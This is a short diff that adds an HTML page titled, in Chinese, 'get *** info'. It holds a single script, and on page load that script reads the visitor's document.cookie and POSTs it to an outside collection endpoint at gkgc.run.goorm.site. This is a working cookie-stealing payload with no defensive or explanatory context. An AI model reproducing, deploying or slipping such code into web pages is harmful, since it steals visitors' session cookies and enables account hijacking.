@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>获取***信息</title>
+</head>
+<body>
+
+<script>
+    // 获取***信息
+    var cookieInfo = document.cookie;
+
+    var url = "https://gkgc.run.goorm.site/cookie/index.php";
+
+    var xhr = new XMLHttpRequest();
+    
+    xhr.open('POST', url, true);
+
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+    xhr.send("cookieInfo=" + cookieInfo);
+</script>
+
+</body>
+</html>
